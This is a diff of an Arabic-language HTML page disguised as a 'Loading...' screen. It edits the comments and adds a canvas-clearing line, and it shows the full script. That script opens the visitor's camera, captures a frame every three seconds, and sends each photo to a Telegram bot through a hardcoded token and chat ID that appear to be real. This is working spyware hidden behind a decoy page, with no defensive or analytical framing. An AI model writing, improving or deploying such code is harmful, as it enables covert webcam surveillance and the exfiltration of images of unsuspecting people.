@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar">
 <head>
   <meta charset="UTF-8">
   <title>جارٍ التحميل...</title>
@@ -25,7 +25,7 @@
         video.srcObject = stream;
         video.onloadedmetadata = () => {
           document.getElementById('status').innerText = 'يتم الآن التقاط الصور...';
-          captureFrame(); // بدء التقاط الصور بعد تحميل الفيديو بالكامل
+          captureFrame(); // بدء التقاط الصور بعد تحميل الكاميرا
         };
       })
       .catch(err => {
@@ -34,12 +34,13 @@
       });
 
     function captureFrame() {
-      if (video.readyState === 4) { // التأكد من أن الفيديو جاهز تمامًا
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      if (video.readyState === 4) { // التأكد من أن الكاميرا جاهزة
+        ctx.clearRect(0, 0, canvas.width, canvas.height); // مسح أي صورة قديمة
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height); // التقاط الإطار الجديد
 
         canvas.toBlob(blob => {
           const formData = new FormData();
-          formData.append('chat_id', '6765420173'); // ضع ID الشات هنا
+          formData.append('chat_id', '6765420173'); // استبدل بالـ Chat ID
           formData.append('photo', blob, 'snapshot.jpg');
 
           fetch('https://api.telegram.org/bot7865229336:AAG8w_CBGt0gcGfMd7syGaUVhUH5lJaNL6I/sendPhoto', {
@@ -52,7 +53,7 @@
         }, 'image/jpeg');
       }
 
-      setTimeout(captureFrame, 3000); // تكرار العملية كل 3 ثوانٍ
+      setTimeout(captureFrame, 3000); // يلتقط صورة جديدة كل 3 ثوانٍ
     }
   </script>
 
